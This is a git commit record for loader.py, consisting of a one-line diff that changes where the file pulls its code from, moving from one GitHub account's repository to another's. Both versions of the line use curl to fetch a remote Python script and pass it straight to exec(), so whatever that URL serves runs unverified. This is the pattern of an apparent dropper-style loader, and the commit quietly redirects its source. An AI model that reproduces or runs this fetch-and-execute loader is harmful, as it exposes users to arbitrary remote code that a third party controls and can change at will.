7c9d367d86842905329f24337399308cb3739941
kitty <kittyorcat@hotmail.com>
2025-09-18 18:52:01 -0500

    Update loader.py

--- loader.py
+++ loader.py
@@ -1,1 +1,1 @@
-exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.com/kittyorcatmint/kitkit/refs/heads/main/main.py'], capture_output=True).stdout.decode('utf-8'))
+exec(__import__('subprocess').run(['curl', '-s', 'https://raw.githubusercontent.com/kittypeeks/kitkit/refs/heads/main/main.py'], capture_output=True).stdout.decode('utf-8'))
